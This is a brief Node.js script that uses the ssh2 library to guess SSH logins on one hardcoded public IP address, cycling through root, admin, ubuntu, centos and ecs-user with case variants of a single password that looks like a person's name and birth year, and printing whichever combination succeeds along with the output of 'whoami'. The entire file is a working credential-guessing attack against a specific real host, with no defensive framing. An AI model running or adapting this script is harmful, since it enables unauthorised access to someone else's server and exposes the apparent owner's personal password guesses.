const { Client } = require('ssh2');

function tryConnect(user, pass) {
  return new Promise((resolve, reject) => {
    const conn = new Client();
    const timeout = setTimeout(() => {
      conn.end();
      reject(new Error('timeout'));
    }, 15000);

    conn.on('ready', () => {
      clearTimeout(timeout);
      conn.exec('echo OK && whoami', (err, stream) => {
        let out = '';
        stream.on('data', d => out += d);
        stream.on('close', () => { conn.end(); resolve(out.trim()); });
      });
    });
    conn.on('error', err => { clearTimeout(timeout); reject(err.message); });
    conn.connect({ host:'47.102.158.179', port:22, username:user, password:pass, readyTimeout:12000 });
  });
}

async function main() {
  const combos = [
    ['root', 'wangkun1982'],
    ['root', 'Wangkun1982'],
    ['root', 'WANGKUN1982'],
    ['ecs-user', 'wangkun1982'],
    ['admin', 'wangkun1982'],
    ['ubuntu', 'wangkun1982'],
    ['centos', 'wangkun1982'],
  ];

  for (const [u, p] of combos) {
    try {
      const result = await tryConnect(u, p);
      console.log(`[OK] ${u}:${p} => ${result}`);
      return;
    } catch(e) {
      console.log(`[FAIL] ${u}:${p} => ${e}`);
    }
  }
}

main();
